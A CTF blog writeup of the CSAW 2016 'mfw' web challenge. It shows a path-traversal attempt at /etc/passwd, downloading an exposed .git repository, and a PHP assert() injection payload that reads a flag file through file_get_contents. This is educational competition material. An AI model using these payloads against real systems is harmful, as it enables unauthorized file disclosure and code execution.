---
title: '[CSAW 2016] mfw Writeup'
author: Megabeets
type: post
date: 2016-09-18T22:02:18+00:00
url: /csaw-2016-mfw-writeup/
categories:
  - CSAW CTF 2016
  - Writeups
tags:
  - CSAW-2016
  - CTF
  - Web

---
#### **Description:**

> Hey, I made my first website today. It&#8217;s pretty cool and web7.9.  
> <http://web.chal.csaw.io:8000/>

&nbsp;

Entering the site, the first thing that comes to mind is a LFI attack. The site is including a page which is requested in the URL.

The following table describes the possible respond pages:

<table style="width: 945px;">
  <tr>
    <td style="width: 418.869px;">
      <strong>URL</strong>
    </td>
    
    <td style="width: 484.131px;">
      <strong>Result</strong>
    </td>
  </tr>
  
  <tr>
    <td style="width: 418.869px;">
      http://web.chal.csaw.io:8000/?page=home
    </td>
    
    <td style="width: 484.131px;">
      The &#8220;home&#8221; page is shown.
    </td>
  </tr>
  
  <tr>
    <td style="width: 418.869px;">
      http://web.chal.csaw.io:8000/?page=about
    </td>
    
    <td style="width: 484.131px;">
      The &#8220;about&#8221; page is shown.
    </td>
  </tr>
  
  <tr>
    <td style="width: 418.869px;">
      http://web.chal.csaw.io:8000/?page=contact
    </td>
    
    <td style="width: 484.131px;">
      The &#8220;contact&#8221; page is shown.
    </td>
  </tr>
  
  <tr>
    <td style="width: 418.869px;">
      http://web.chal.csaw.io:8000/?page=Megabeets
    </td>
    
    <td style="width: 484.131px;">
      Just a message saying: &#8220;That file doesn&#8217;t exist!&#8221;
    </td>
  </tr>
  
  <tr>
    <td style="width: 418.869px;">
      http://web.chal.csaw.io:8000/?page=flag
    </td>
    
    <td style="width: 484.131px;">
      An empty page is shown <strong>inside </strong>the website.
    </td>
  </tr>
  
  <tr>
    <td style="width: 418.869px;">
      http://web.chal.csaw.io:8000/?page=../../../../etc/passwd
    </td>
    
    <td style="width: 484.131px;">
      Just a message saying: &#8220;Detected hacking attempt!&#8221;
    </td>
  </tr>
</table>

Looking at the source code i saw the following comment:

<pre class="lang:php decode:true">&lt;!--&lt;li &gt;&lt;a href="?page=flag"&gt;My secrets&lt;/a&gt;&lt;/li&gt; --&gt;</pre>

Ok, I need to get the &#8220;flag&#8221; page but any LFI technique I tried didn&#8217;t work. I thought about something else, In the &#8220;about&#8221; page the creator of the site mentioned that it was built using git. So let&#8217;s see if I am able to download the repository. The page http://web.chal.csaw.io:8000/.git/config exists so I downloaded the repository using <a href="https://github.com/kost/dvcs-ripper" target="_blank">DVCS-RIPPER</a>.

You can find index.php [here][1].

So the page is using assert() which is vulnerable to Command Injection attack. After a little trial and error I came up with the answer:

<pre class="lang:ps decode:true">(Invoke-WebRequest "http://web.chal.csaw.io:8000/?page=Megabeets') || var_dump(file_get_contents('templates/flag.php'));// Comment").Content</pre>

And received the flag:

<pre class="lang:php decode:true">string(52) "&lt;?php $FLAG="flag{3vald_@ss3rt_1s_best_a$$ert}"; ?&gt;
"
Detected hacking attempt!</pre>

If you try entering [the url][2] in a browser, look in the source of the page (CTRL+U), the flag is commented.

<div class="nf-post-footer">
  <p style="text-align: right">
    <a href="https://www.megabeets.net/about.html#vegan"><img class="wp-image-149 alignnone" src="https://www.megabeets.net/uploads/megabeets_inline_logo.png" alt="megabeets_inline_logo" width="61" height="45" />Eat Veggies</a>
  </p>
</div>

 [1]: https://gist.github.com/ITAYC0HEN/20edf000082b0765b493fb893cec96de
 [2]: http://web.chal.csaw.io:8000/?page=Megabeets') || var_dump(file_get_contents('templates/flag.php'));// Comment the rest of the line